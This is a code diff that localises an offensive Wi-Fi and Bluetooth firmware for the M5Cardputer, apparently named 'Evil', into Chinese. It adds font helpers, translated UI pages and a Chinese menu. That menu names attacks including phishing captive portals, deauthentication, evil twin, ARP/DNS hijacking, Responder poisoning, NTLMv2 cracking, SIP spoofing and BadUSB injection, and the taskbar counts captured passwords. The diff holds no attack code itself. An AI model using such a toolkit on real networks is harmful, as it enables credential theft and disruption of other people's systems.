@@ -29,6 +29,8 @@
    regarding network testing and ethical hacking.
 */
 
+#include <Arduino.h>
+
 struct StreamItem;
 struct UrlParts;
 struct UrlPartsCrawl;
@@ -135,12 +137,124 @@ struct PcapHsEntry {
 #include <TinyGPSPlus.h>
 #include <Adafruit_NeoPixel.h> //led
 #include "M5Cardputer.h"
+
+// ==================== efontCN Chinese Font Engine ====================
+static inline void evilSetCnFont(lgfx::LGFXBase &gfx, float logicalSize = 1.5f) {
+  const lgfx::IFont* cur = gfx.getFont();
+  // Preserve FreeFonts (ft_gfx) when explicitly selected (e.g. TagTinker ESL editor)
+  if (cur && cur->getType() == lgfx::IFont::ft_gfx) {
+    gfx.lgfx::LGFXBase::setTextSize(logicalSize);
+    return;
+  }
+  if (logicalSize <= 1.15f) {
+    gfx.setFont(&fonts::efontCN_10);
+    gfx.lgfx::LGFXBase::setTextSize(1.0f);
+  } else if (logicalSize <= 1.85f) {
+    gfx.setFont(&fonts::efontCN_12);
+    gfx.lgfx::LGFXBase::setTextSize(1.0f);
+  } else {
+    gfx.setFont(&fonts::efontCN_12);
+    gfx.lgfx::LGFXBase::setTextSize(logicalSize * (8.0f / 12.0f));
+  }
+}
+
+static inline void evilSetCnFont(lgfx::LGFXBase &gfx, float sx, float sy) {
+  const lgfx::IFont* cur = gfx.getFont();
+  if (cur && cur->getType() == lgfx::IFont::ft_gfx) {
+    gfx.lgfx::LGFXBase::setTextSize(sx, sy);
+    return;
+  }
+  evilSetCnFont(gfx, (sx > sy) ? sx : sy);
+}
+
+static inline void evilKeepCnFont(lgfx::LGFXBase &gfx) {
+  const lgfx::IFont* cur = gfx.getFont();
+  if (!cur || cur->getType() != lgfx::IFont::ft_u8g2) {
+    gfx.setFont(&fonts::efontCN_10);
+    gfx.lgfx::LGFXBase::setTextSize(1.0f);
+  }
+}
+
+class EvilCanvas : public M5Canvas {
+public:
+  EvilCanvas() : M5Canvas() {
+    this->setFont(&fonts::efontCN_10);
+    this->lgfx::LGFXBase::setTextSize(1.0f);
+  }
+  EvilCanvas(lgfx::LovyanGFX* parent) : M5Canvas(parent) {
+    this->setFont(&fonts::efontCN_10);
+    this->lgfx::LGFXBase::setTextSize(1.0f);
+  }
+};
+#define M5Canvas EvilCanvas
+#define LGFX_Sprite EvilCanvas
+
+// UTF-8 safe byte truncation (never splits a multi-byte UTF-8 sequence)
+static inline String evilUtf8TruncBytes(const String &s, size_t maxBytes) {
+  if (s.length() <= maxBytes) return s;
+  size_t pos = 0;
+  while (pos < s.length()) {
+    uint8_t c = (uint8_t)s[pos];
+    size_t clen = 1;
+    if ((c & 0x80) == 0) clen = 1;
+    else if ((c & 0xE0) == 0xC0) clen = 2;
+    else if ((c & 0xF0) == 0xE0) clen = 3;
+    else if ((c & 0xF8) == 0xF0) clen = 4;
+    if (pos + clen > maxBytes) break;
+    pos += clen;
+  }
+  return s.substring(0, pos);
+}
+
+// UTF-8 safe pixel width clipping
+static inline String evilUtf8ClipPx(lgfx::LGFXBase &gfx, const String &s, int maxPx) {
+  if (gfx.textWidth(s) <= maxPx) return s;
+  size_t pos = 0;
+  size_t lastFit = 0;
+  while (pos < s.length()) {
+    uint8_t c = (uint8_t)s[pos];
+    size_t clen = 1;
+    if ((c & 0x80) == 0) clen = 1;
+    else if ((c & 0xE0) == 0xC0) clen = 2;
+    else if ((c & 0xF0) == 0xE0) clen = 3;
+    else if ((c & 0xF8) == 0xF0) clen = 4;
+    size_t nextPos = pos + clen;
+    if (nextPos > s.length()) nextPos = s.length();
+    if (gfx.textWidth(s.substring(0, nextPos)) > maxPx) break;
+    lastFit = nextPos;
+    pos = nextPos;
+  }
+  return s.substring(0, lastFit);
+}
+// =====================================================================
 #include <ArduinoJson.h>
 #include <esp_now.h>
 #include <esp_netif.h>
 #include <esp_netif_net_stack.h>
 #include <esp_idf_version.h>
 #include <esp_heap_caps.h>
+
+#if ESP_IDF_VERSION < ESP_IDF_VERSION_VAL(5, 0, 0)
+typedef struct esp_now_recv_info_t {
+  uint8_t *src_addr;
+  uint8_t *des_addr;
+  uint8_t rx_ctrl;
+} esp_now_recv_info_t;
+#endif
+
+#include <map>
+
+// Forward declarations for STL / extern "C" functions that arduino-preprocessor skips
+extern "C" void send_pwnagotchi_beacon_main();
+bool mjpegViewerFS(const char* url, fs::FS& fs, const char* pathA, const char* pathB);
+int menuSelectList(const std::vector<String>& items, const char* title);
+std::string mac_to_string(const uint8_t* mac);
+bool isRegularAP(const std::string& mac);
+void displayHostOptions(const std::vector<IPAddress>& hostslist);
+void afterScanOptions(IPAddress ip, const std::vector<IPAddress>& hostslist);
+void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanIndex, bool isWebCommand);
+void displayResults(int displayStart, int maxLines, const std::vector<String>& scanResults);
+void fetchWebsites(const std::vector<IPAddress>& hostslist, const std::map<IPAddress, std::vector<int>>& openPorts, int scanIndex);
 
 #include "BLEDevice.h"
 #include <BLEUtils.h>
@@ -320,7 +434,7 @@ const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-static const char * const PROGMEM menuItems[] = {
+static const char * const PROGMEM menuItemsEn[] = {
   "Scan WiFi",
   "Select Network",
   "Clone & Details",
@@ -423,6 +537,109 @@ static const char * const PROGMEM menuItems[] = {
   "Settings",
 };
 
+static const char * const PROGMEM menuItems[] = {
+  "扫描 WiFi",
+  "选择网络",
+  "克隆与详情",
+  "设置 WiFi 名称",
+  "设置 WiFi 密码",
+  "设置 MAC 地址",
+  "启动认证门户",
+  "停止认证门户",
+  "更换钓鱼门户",
+  "查看捕获凭据",
+  "清空捕获凭据",
+  "运行状态监控",
+  "探测帧攻击",
+  "探测帧嗅探",
+  "Karma 攻击",
+  "Karma 自动模式",
+  "Karma 定向鱼叉",
+  "选择探测 SSID",
+  "删除探测 SSID",
+  "清空探测列表",
+  "Wardriving 路测",
+  "Wardriving 大师",
+  "信标帧洪水",
+  "Deauth 断网攻击",
+  "自动 Deauth 攻击",
+  "Evil Twin 邪恶双子",
+  "握手包捕获大师",
+  "WiFi 原始包嗅探",
+  "客户端原始嗅探",
+  "WiFi 信道频谱图",
+  "客户端嗅探与踢下线",
+  "握手包被动监听",
+  "查看已抓握手包",
+  "Flipper 监测墙",
+  "连接 WiFi 网络",
+  "SSH 远程终端",
+  "单 IP 端口扫描",
+  "内网存活主机扫描",
+  "内网全端口扫描",
+  "扫描结果主机列表",
+  "Web 网站爬虫",
+  "PwnGrid 信标洪泛",
+  "盗刷器蓝牙检测",
+  "USB 鼠标防休眠",
+  "BadUSB 注入",
+  "蓝牙键盘注入",
+  "反向 TCP 隧道",
+  "DHCP 地址池耗尽",
+  "伪造 DHCP (STA)",
+  "伪造 DHCP (AP)",
+  "切换 DNS 服务器",
+  "ARP/DNS 网络劫持",
+  "发现网络打印机",
+  "网络打印机打印",
+  "查看打印机状态",
+  "Telnet 蜜罐",
+  "LLM AI 对话",
+  "Mesh 离线群聊",
+  "USB 挂载 SD 卡",
+  "Responder 投毒",
+  "WPAD 代理劫持",
+  "NTLMv2 字典破解",
+  "NTLMv2 哈希去重",
+  "SD 卡文件管理器",
+  "UART 串口终端",
+  "SIP 话机扫描",
+  "SIP 分机号枚举",
+  "SIP 短信伪造",
+  "SIP 呼叫洪水",
+  "SIP 全员振铃",
+  "CCTV 摄像头渗透",
+  "SSDP 发现投毒",
+  "SkyJack 无人机劫持",
+  "WiFi 暗网投递箱",
+  "蓝牙名称洪水",
+  "AirTag 追踪监测墙",
+  "FindMy 苹果信标",
+  "UPnP 端口映射列表",
+  "UPnP NAT 穿透",
+  "LDAP 域信息导出",
+  "伪基站检测 (IMSI)",
+  "开放 WiFi 检测",
+  "ESP32-C5 串口控制",
+  "Aircrack 握手包破解",
+  "Autodiscover 劫持",
+  "CIW 零点击利用",
+  "TagTinker 电子价签",
+  "CSI 穿墙动作雷达",
+  "Totem 队友罗盘",
+  "Sub-GHz 射频工具",
+  "NFC 近场渗透工具",
+  "WhisperPair 蓝牙",
+  "苹果 BLE 广播嗅探",
+  "WPS 漏洞审计",
+  "WiFi 信标详情扫描",
+  "BLE GATT 浏览器",
+  "LoRaWAN 嗅探器",
+  "WiFi 空间雷达",
+  "SMB 内网共享渗透",
+  "系统设置",
+};
+
 
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
 
@@ -481,7 +698,7 @@ bool guardAdmin() {
 // ---- Shared Admin UI helpers (unified look & feel) ----
 static String adminPageStart(const String &title) {
   String html;
-  html += F("<!doctype html><html lang=\"en\"><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>");
+  html += F("<!doctype html><html lang=\"zh-CN\"><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>");
   html += title;
   html += F("</title><style>");
   // Base theme (matches /admin aesthetics)
@@ -524,7 +741,7 @@ static String adminPageStart(const String &title) {
   html += F("#doneBox{display:none;margin-top:10px;padding:10px;background:linear-gradient(135deg,var(--acc2),#41e18d);color:#0b1020;border-radius:10px;font-size:13px;font-weight:600}");
   html += F("</style><body><div class=\"wrap\"><div class=\"hd\"><div><h2 class=\"tt\">");
   html += title;
-  html += F("</h2><p class=\"sub\">Admin • Unified UI</p></div><div class=\"right\"><a class=\"btn\" href=\"/evil-menu\">Menu</a></div></div><div class=\"ct\">");
+  html += F("</h2><p class=\"sub\">管理后台 | 统一控制面板</p></div><div class=\"right\"><a class=\"btn\" href=\"/evil-menu\">主菜单</a></div></div><div class=\"ct\">");
   return html;
 }
 
@@ -710,7 +927,7 @@ static const char* MODERN_PANEL_HTML = R"rawliteral(
     const links=[...document.querySelectorAll('.nav-link')];
     const title=document.getElementById('title');
     const views={dashboard:'view-dashboard', files:'view-files', upload:'view-upload', portal:'view-portal', monitor:'view-monitor', scan:'view-scan', credentials:'view-credentials', badusb:'view-badusb'};
-    function show(name){ Object.values(views).forEach(id=>document.getElementById(id).hidden=true); const id=views[name]; if(id){ document.getElementById(id).hidden=false; title.textContent = name[0].toUpperCase() + name.slice(1); } }
+    const show = function(name){ Object.values(views).forEach(id=>document.getElementById(id).hidden=true); const id=views[name]; if(id){ document.getElementById(id).hidden=false; title.textContent = name[0].toUpperCase() + name.slice(1); } };
     links.forEach(a=>a.addEventListener('click',e=>{e.preventDefault(); links.forEach(x=>x.classList.remove('active')); a.classList.add('active'); show(a.dataset.view); }));
     document.querySelectorAll('[data-jump]').forEach(c=>c.addEventListener('click',e=>{e.preventDefault(); const k=c.dataset.jump; document.querySelector(`.nav-link[data-view="${k}"]`).click(); }));
     show('dashboard');
@@ -1347,11 +1564,11 @@ static void handleNavInput() {
 // ── Navigator HTML page (PROGMEM) ────────────────────────────────────────────
 static const char NAV_HTML[] PROGMEM = R"RAWHTML(
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Evil Navigator</title>
+<title>Evil 远程屏幕控制</title>
 <style>
 :root{--bg:#0a0e17;--card:#0f1520;--line:#1a2435;--text:#e5e7eb;--muted:#7b8494;--accent:#6366f1;--accent2:#22d3ee;--green:#22c55e;--red:#ef4444;--yellow:#eab308}
 *{box-sizing:border-box;margin:0;padding:0}
@@ -1366,7 +1583,7 @@ canvas{display:block;image-rendering:pixelated;width:100%;height:auto}
 .overlay{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:var(--accent2);font-size:13px;opacity:.7;pointer-events:none;display:none}
 .controls{display:flex;flex-direction:column;gap:8px;min-width:140px}
 .ctrl-group{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:10px;display:flex;flex-direction:column;gap:6px}
-.ctrl-group h3{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px}
+.ctrl-group h3{font-size:12px;color:var(--muted);letter-spacing:.06em;margin-bottom:4px}
 .btn{display:flex;align-items:center;justify-content:center;gap:6px;padding:10px 14px;border:1px solid var(--line);border-radius:10px;background:rgba(255,255,255,.04);color:var(--text);cursor:pointer;font:inherit;font-size:13px;font-weight:500;transition:all .12s ease;user-select:none;-webkit-user-select:none}
 .btn:hover{background:rgba(255,255,255,.08);border-color:rgba(255,255,255,.15);transform:translateY(-1px)}
 .btn:active{transform:scale(.97);background:rgba(99,102,241,.15)}
@@ -1379,7 +1596,7 @@ canvas{display:block;image-rendering:pixelated;width:100%;height:auto}
 .fps{position:absolute;top:6px;right:8px;background:rgba(0,0,0,.6);color:var(--accent2);font-size:11px;padding:2px 6px;border-radius:6px;pointer-events:none}
 .kbd-hint{font-size:11px;color:var(--muted);text-align:center;padding:4px 0}
 .vkb{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:8px;width:480px;max-width:100%}
-.vkb h3{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px;text-align:center}
+.vkb h3{font-size:12px;color:var(--muted);letter-spacing:.06em;margin-bottom:6px;text-align:center}
 .kr{display:flex;gap:3px;margin-bottom:3px}.kk{flex:1;padding:8px 0;border:1px solid var(--line);border-radius:6px;background:rgba(255,255,255,.06);color:var(--text);cursor:pointer;font:12px/1 system-ui;text-align:center;min-width:0;transition:all .1s;user-select:none;-webkit-user-select:none}
 .kk:hover{background:rgba(255,255,255,.12);border-color:rgba(255,255,255,.18)}.kk:active{background:rgba(99,102,241,.25);transform:scale(.94)}.kk.ka{background:rgba(99,102,241,.25);border-color:var(--accent)}
 .kk.sp{font-size:10px;font-weight:600;color:var(--muted)}
@@ -1390,56 +1607,56 @@ canvas{display:block;image-rendering:pixelated;width:100%;height:auto}
 
 <div class="outer">
 <div class="top">
-  <h1>Evil Navigator</h1>
-  <span style="font-size:12px;color:var(--muted)">Screen Streaming + Remote Control</span>
-  <span class="meta"><a href="/evil-menu" style="color:var(--accent2);text-decoration:none">&larr; Admin</a></span>
+  <h1>Evil 远程屏幕控制</h1>
+  <span style="font-size:12px;color:var(--muted)">屏幕实时串流与按键注入</span>
+  <span class="meta"><a href="/evil-menu" style="color:var(--accent2);text-decoration:none">&larr; 返回管理后台</a></span>
 </div>
 
 <div class="main">
   <div style="display:flex;flex-direction:column;align-items:center;gap:8px">
     <div class="screen-wrap">
       <canvas id="screen" width="480" height="270"></canvas>
-      <div class="overlay" id="overlay">Connecting...</div>
+      <div class="overlay" id="overlay">连接中...</div>
       <div class="fps" id="fps">-- fps</div>
     </div>
-    <div class="vkb"><h3>Cardputer Keyboard</h3><div id="kb"></div></div>
+    <div class="vkb"><h3>Cardputer 虚拟键盘</h3><div id="kb"></div></div>
   </div>
 
   <div class="controls">
     <div style="display:flex;gap:8px">
       <div class="ctrl-group" style="flex:1">
-        <h3>Navigation</h3>
+        <h3>方向控制</h3>
         <div class="nav-grid">
           <div></div>
-          <button class="btn" onclick="send('up')" title="Up (;)">&#9650;</button>
+          <button class="btn" onclick="send('up')" title="上移 (;)">&#9650;</button>
           <div></div>
-          <button class="btn" onclick="send('pgup')" title="Page Up (,)">&#9664;</button>
-          <button class="btn accent" onclick="send('enter')" title="Enter">OK</button>
-          <button class="btn" onclick="send('pgdown')" title="Page Down (/)">&#9654;</button>
+          <button class="btn" onclick="send('pgup')" title="上一页 (,)">&#9664;</button>
+          <button class="btn accent" onclick="send('enter')" title="确认 (Enter)">确定</button>
+          <button class="btn" onclick="send('pgdown')" title="下一页 (/)">&#9654;</button>
           <div></div>
-          <button class="btn" onclick="send('down')" title="Down (.)">&#9660;</button>
+          <button class="btn" onclick="send('down')" title="下移 (.)">&#9660;</button>
           <div></div>
         </div>
       </div>
       <div class="ctrl-group" style="flex:1">
-        <h3>Actions</h3>
-        <button class="btn red" onclick="send('back')" title="Backspace">&larr; Back</button>
-        <button class="btn" onclick="refreshNow()" title="Force refresh (R)">&#10227; Refresh</button>
+        <h3>操作</h3>
+        <button class="btn red" onclick="send('back')" title="返回 (Backspace)">&larr; 返回</button>
+        <button class="btn" onclick="refreshNow()" title="强制刷新 (R)">&#10227; 刷新</button>
       </div>
     </div>
 
     <div class="ctrl-group">
-      <h3>Stream</h3>
-      <button class="btn green" id="toggleBtn" onclick="toggleStream()">&#9208; Pause</button>
+      <h3>画面推流</h3>
+      <button class="btn green" id="toggleBtn" onclick="toggleStream()">&#9208; 暂停</button>
       <div style="display:flex;align-items:center;gap:6px;font-size:12px;color:var(--muted)">
-        <label>Interval</label>
+        <label>刷新间隔</label>
         <input type="range" id="interval" min="100" max="2000" value="1000" step="50" style="flex:1;accent-color:var(--accent)">
         <span id="intervalVal">1000ms</span>
       </div>
     </div>
 
     <div class="kbd-hint">
-      Keyboard: &uarr;&darr; navigate &middot; Enter select &middot; Backspace back &middot; R refresh &middot; Space pause
+      快捷键: &uarr;&darr; 移动 | Enter 确认 | Backspace 返回 | R 刷新 | 空格 暂停
     </div>
   </div>
 </div>
@@ -1463,12 +1680,12 @@ let timer = null;
 let frameCount = 0;
 let lastFpsTime = Date.now();
 
-function send(key) {
+const send = function(key) {
   fetch('/nav-input?key=' + key, {method:'POST'}).catch(()=>{});
   setTimeout(refreshNow, 80);
-}
+};
 
-async function fetchFrame() {
+const fetchFrame = async function() {
   try {
     const resp = await fetch('/nav-screen', {cache:'no-store'});
     if (!resp.ok) throw new Error(resp.status);
@@ -1512,13 +1729,13 @@ async function fetchFrame() {
     frameCount++;
   } catch(e) {
     overlay.style.display = 'block';
-    overlay.textContent = 'Connection lost...';
+    overlay.textContent = '连接已断开...';
   }
 }
 
-function refreshNow() {
+const refreshNow = function() {
   fetchFrame();
-}
+};
 
 setInterval(() => {
   const now = Date.now();
@@ -1529,23 +1746,23 @@ setInterval(() => {
   lastFpsTime = now;
 }, 2000);
 
-function startStream() {
+const startStream = function() {
   if (timer) clearInterval(timer);
   const ms = parseInt(intervalSlider.value);
   timer = setInterval(fetchFrame, ms);
   fetchFrame();
-}
+};
 
-function stopStream() {
+const stopStream = function() {
   if (timer) { clearInterval(timer); timer = null; }
-}
+};
 
-function toggleStream() {
+const toggleStream = function() {
   streaming = !streaming;
-  toggleBtn.textContent = streaming ? '\u23F8 Pause' : '\u25B6 Resume';
+  toggleBtn.textContent = streaming ? '\u23F8 暂停' : '\u25B6 继续';
   toggleBtn.className = streaming ? 'btn green' : 'btn accent';
   if (streaming) startStream(); else stopStream();
-}
+};
 
 intervalSlider.addEventListener('input', () => {
   intervalVal.textContent = intervalSlider.value + 'ms';
@@ -1587,16 +1804,16 @@ document.addEventListener('keydown', e => {
 // ── Virtual Keyboard (Cardputer layout) ──
 let shifted=false;
 // k(normalCode,shiftCode) = regular key, s(code,label,width) = special key
-function _k(n,s){return{n:n,s:s}}
-function _s(c,l,w,t){return{c:c,l:l,w:w||1,t:t}}
+const _k = function(n,s){return{n:n,s:s}};
+const _s = function(c,l,w,t){return{c:c,l:l,w:w||1,t:t}};
 const KB=[
 [_k(96,126),_k(49,33),_k(50,64),_k(51,35),_k(52,36),_k(53,37),_k(54,94),_k(55,38),_k(56,42),_k(57,40),_k(48,41),_k(45,95),_k(61,43),_s(42,'\u232B',1.5)],
 [_s(43,'Tab',1.5),_k(113,81),_k(119,87),_k(101,69),_k(114,82),_k(116,84),_k(121,89),_k(117,85),_k(105,73),_k(111,79),_k(112,80),_k(91,123),_k(93,125),_k(92,124)],
 [_s(255,'Fn',1.2),_s(129,'\u21E7',1.2,'shift'),_k(97,65),_k(115,83),_k(100,68),_k(102,70),_k(103,71),_k(104,72),_k(106,74),_k(107,75),_k(108,76),_k(59,58),_k(39,34),_s(40,'\u21B5',1.2)],
 [_s(128,'Ctrl',1.3),_s(0,'Opt',1),_s(130,'Alt',1),_k(122,90),_k(120,88),_k(99,67),_k(118,86),_k(98,66),_k(110,78),_k(109,77),_k(44,60),_k(46,62),_k(47,63),_s(32,'Space',2)]
 ];
-function sc(c){fetch('/nav-input?key=char&c='+c,{method:'POST'}).catch(function(){});setTimeout(refreshNow,80);}
-function buildKB(){
+const sc = function(c){fetch('/nav-input?key=char&c='+c,{method:'POST'}).catch(function(){});setTimeout(refreshNow,80);};
+const buildKB = function(){
 var el=document.getElementById('kb');el.innerHTML='';
 KB.forEach(function(row){
 var r=document.createElement('div');r.className='kr';
@@ -1689,14 +1906,16 @@ void setup() {
   Serial.begin(115200);
   M5.begin();
   M5.Lcd.setRotation(1);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(menuTextUnFocusedColor);
-  M5.Display.setTextFont(1);
+  evilKeepCnFont(M5.Display);
+  // Ensure all SPI Chip Select pins are explicitly pulled HIGH (deselected) on boot
+  pinMode(5, OUTPUT);  digitalWrite(5, HIGH);  // CC1101 CS
+  pinMode(6, OUTPUT);  digitalWrite(6, HIGH);  // NFC ST25R3916 CS
+  pinMode(12, OUTPUT); digitalWrite(12, HIGH); // SD Card CS
   if (M5.getBoard() == m5::board_t::board_M5CardputerADV) {
     gpsRxPin = 15;   // Adv
     gpsTxPin = 13;
-    pinMode(5, OUTPUT);
-    digitalWrite(5, HIGH);
     Serial.println("Detected: Cardputer-ADV");
   } else if (M5.getBoard() == m5::board_t::board_M5Cardputer) {
     gpsRxPin = 1;    // Normal Cardputer
@@ -2007,7 +2226,11 @@ void setup() {
   int randomIndex = random(numMessages);
   const char* randomMessage = startUpMessages[randomIndex];
 
-  SPI.begin(SCK, MISO, MOSI, -1);
+  SPI.end();
+  SPI.begin(40, 39, 14, -1);
+  pinMode(12, OUTPUT); digitalWrite(12, HIGH); // SD_CS
+  pinMode(5, OUTPUT);  digitalWrite(5, HIGH);  // CC_CS
+  pinMode(6, OUTPUT);  digitalWrite(6, HIGH);  // NFC_CS
   if (!SD.begin(12, SPI, 40000000UL)) {
     Serial.println(F("Error.."));
     Serial.println(F("SD card not mounted..."));
@@ -2015,17 +2238,17 @@ void setup() {
     M5.Display.drawRect(10, 20, 220, 95, TFT_RED);
     M5.Display.fillRect(11, 21, 218, 93, taskbarBackgroundColor);
     M5.Display.setTextColor(TFT_GREEN);
-    M5.Display.setTextSize(2);
-    int textWidth = M5.Display.textWidth("SD Card Error");
+    evilSetCnFont(M5.Display, 2);
+    int textWidth = M5.Display.textWidth("SD 卡未就绪");
     M5.Display.setCursor((240 - textWidth) / 2, 40);
-    M5.Display.println("SD Card Error");
+    M5.Display.println("SD 卡未就绪");
     M5.Display.setTextColor(TFT_RED);
-    M5.Display.setTextSize(1);
-    textWidth = M5.Display.textWidth("Evil cannot work without SD card");
+    evilSetCnFont(M5.Display, 1);
+    textWidth = M5.Display.textWidth("固件运行需要挂载 SD 卡");
     M5.Display.setCursor((240 - textWidth) / 2, 85);
-    M5.Display.println("Evil cannot work without SD card");
+    M5.Display.println("固件运行需要挂载 SD 卡");
     delay(4000);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
   } else {
     Serial.println(F("----------------------"));
     Serial.println(F("SD card initialized !! "));
@@ -2263,7 +2486,7 @@ void setup() {
       Serial.println(F("Connected to wifi !!!"));
       M5.Display.clear();
       M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2);
-      M5.Display.println("Connected to");
+      M5.Display.println("已连接 WiFi:");
       M5.Lcd.setCursor(M5.Display.width() / 2 - 48, M5.Display.height() / 2 + 12);
       M5.Display.println(ssid);
       delay(1000);
@@ -2378,41 +2601,41 @@ void drawTaskBar() {
   if (Colorful) {
     // Number of Connections
     int connectedPeople = getConnectedPeopleCount();
-    taskBarCanvas.setCursor(5, 2);
-    taskBarCanvas.print("Sta:");
-    taskBarCanvas.setCursor(30, 2);
+    taskBarCanvas.setCursor(4, 0);
+    taskBarCanvas.print("连:");
+    taskBarCanvas.setCursor(20, 0);
     taskBarCanvas.setTextColor(connectedPeople > 0 ? menuTextFocusedColor : taskbarTextColor);
     taskBarCanvas.print(String(connectedPeople));
 
     // Password Captures
     int capturedPasswords = getCapturedPasswordsCount();
-    taskBarCanvas.setCursor(50, 2); // Position right of connections
+    taskBarCanvas.setCursor(44, 0); // Position right of connections
     taskBarCanvas.setTextColor(taskbarTextColor);
-    taskBarCanvas.print("Pwd:");
-    taskBarCanvas.setCursor(75, 2);
+    taskBarCanvas.print("密:");
+    taskBarCanvas.setCursor(60, 0);
     taskBarCanvas.setTextColor(capturedPasswords > 0 ? menuTextFocusedColor : taskbarTextColor);
     taskBarCanvas.print(String(capturedPasswords));
 
     // Indicateur Captive Portal
-    taskBarCanvas.setCursor(95, 1);
+    taskBarCanvas.setCursor(92, 0);
     taskBarCanvas.setTextColor(taskbarTextColor);
-    taskBarCanvas.print("P:");
-    taskBarCanvas.setCursor(108, 1);
+    taskBarCanvas.print("门:");
+    taskBarCanvas.setCursor(108, 0);
     taskBarCanvas.setTextColor(isCaptivePortalOn ? TFT_GREEN : TFT_RED);
-    taskBarCanvas.print(String(isCaptivePortalOn ? "On" : "Off"));
+    taskBarCanvas.print(String(isCaptivePortalOn ? "开" : "关"));
 
     // Indicateur de connexion réseau
-    taskBarCanvas.setCursor(140, 1); // Position après "P:On/Off"
+    taskBarCanvas.setCursor(134, 0); // Position après "P:On/Off"
     taskBarCanvas.setTextColor(taskbarTextColor);
-    taskBarCanvas.print("C:");
+    taskBarCanvas.print("网:");
     taskBarCanvas.setTextColor(WiFi.localIP().toString() != "0.0.0.0" ? TFT_GREEN : TFT_RED);
-    taskBarCanvas.print(String(WiFi.localIP().toString() != "0.0.0.0" ? "On" : "Off"));
+    taskBarCanvas.print(String(WiFi.localIP().toString() != "0.0.0.0" ? "开" : "关"));
     taskBarCanvas.setTextColor(taskbarTextColor);
 
     // Get/Draw Battery Level
     String batteryLevel = getBatteryLevel();
     int batteryWidth = taskBarCanvas.textWidth(batteryLevel + "%");
-    taskBarCanvas.setCursor(taskBarCanvas.width() - batteryWidth - 5, 1);
+    taskBarCanvas.setCursor(taskBarCanvas.width() - batteryWidth - 4, 0);
 
     int batteryLevelInt = batteryLevel.toInt();  // Convert String to integer once
 
@@ -2422,35 +2645,35 @@ void drawTaskBar() {
   } else {
     // Afficher le nombre de personnes connectées
     int connectedPeople = getConnectedPeopleCount();
-    taskBarCanvas.setCursor(5, 2); // Positionner à gauche
-    taskBarCanvas.print("Sta:" + String(connectedPeople));
+    taskBarCanvas.setCursor(4, 0); // Positionner à gauche
+    taskBarCanvas.print("连:" + String(connectedPeople));
 
     // Afficher le nombre de mots de passe capturés
     int capturedPasswords = getCapturedPasswordsCount();
-    taskBarCanvas.setCursor(50, 2); // Positionner après "Sta"
-    taskBarCanvas.print("Pwd:" + String(capturedPasswords));
+    taskBarCanvas.setCursor(44, 0); // Positionner après "Sta"
+    taskBarCanvas.print("密:" + String(capturedPasswords));
 
     // Indicateur Captive Portal
-    taskBarCanvas.setCursor(95, 2); // Positionner après "Pwd"
+    taskBarCanvas.setCursor(92, 0); // Positionner après "Pwd"
     taskBarCanvas.setTextColor(isCaptivePortalOn ? TFT_GREEN : TFT_RED);
-    taskBarCanvas.print("P:" + String(isCaptivePortalOn ? "On" : "Off"));
+    taskBarCanvas.print("门:" + String(isCaptivePortalOn ? "开" : "关"));
 
     // Indicateur de connexion réseau
-    taskBarCanvas.setCursor(140, 2); // Position après "P:On/Off"
+    taskBarCanvas.setCursor(134, 0); // Position après "P:On/Off"
     taskBarCanvas.setTextColor(taskbarTextColor);
-    taskBarCanvas.print("C:" + String(WiFi.localIP().toString() != "0.0.0.0" ? "On" : "Off"));
+    taskBarCanvas.print("网:" + String(WiFi.localIP().toString() != "0.0.0.0" ? "开" : "关"));
 
     // Afficher le niveau de batterie à droite
     String batteryLevel = getBatteryLevel();
     int batteryWidth = taskBarCanvas.textWidth(batteryLevel + "%");
-    taskBarCanvas.setCursor(taskBarCanvas.width() - batteryWidth - 5, 2); // Positionner à droite
+    taskBarCanvas.setCursor(taskBarCanvas.width() - batteryWidth - 4, 0); // Positionner à droite
     taskBarCanvas.print(batteryLevel + "%");
   }
 
   // Afficher l'indicateur de point clignotant pour les accès aux pages et DNS
   static bool dotState = false;
   dotState = !dotState;
-  taskBarCanvas.setCursor(87, 2); // Positionner après "Pwd"
+  taskBarCanvas.setCursor(80, 0); // Positionner après "Pwd"
 
   if (pageAccessFlag) {
     taskBarCanvas.print("" + String(dotState ? "■" : " "));
@@ -2499,12 +2722,12 @@ void loop() {
       if (secs > 0) {
         for (int t = secs; t > 0; --t) {
           M5.Display.clear();
-          M5.Display.setTextSize(1.5);
+          evilSetCnFont(M5.Display, 1.5);
           M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
           M5.Display.setCursor(10, 40);
-          M5.Display.println("Auto-start in " + String(t) + " s");
+          M5.Display.println("自动启动倒计时: " + String(t) + " 秒");
           M5.Display.setCursor(10, 60);
-          M5.Display.println("Press ENTER to cancel");
+          M5.Display.println("按 ENTER 键取消");
           M5.Display.display();
           uint32_t t0 = millis();
           while (millis() - t0 < 1000) {
@@ -2604,7 +2827,9 @@ void rebuildMenuFilter() {
   }
   for (int i = 0; i < menuSize; ++i) {
     const char* it = (const char*)menuItems[i];
-    if (icase_contains_flash(it, menuSearchQuery, menuSearchLen)) {
+    const char* itEn = (const char*)menuItemsEn[i];
+    if (icase_contains_flash(it, menuSearchQuery, menuSearchLen) ||
+        icase_contains_flash(itEn, menuSearchQuery, menuSearchLen)) {
       menuFilteredIdx[menuFilteredCount++] = i;
     }
   }
@@ -2650,12 +2875,12 @@ void drawSearchBar() {
   M5.Display.fillRect(0, y, M5.Display.width(), barH, TFT_BLACK);
 
   // IMPORTANT: fixer la taille du texte pour ne pas hériter du zoom menu
-  M5.Display.setTextFont(1);
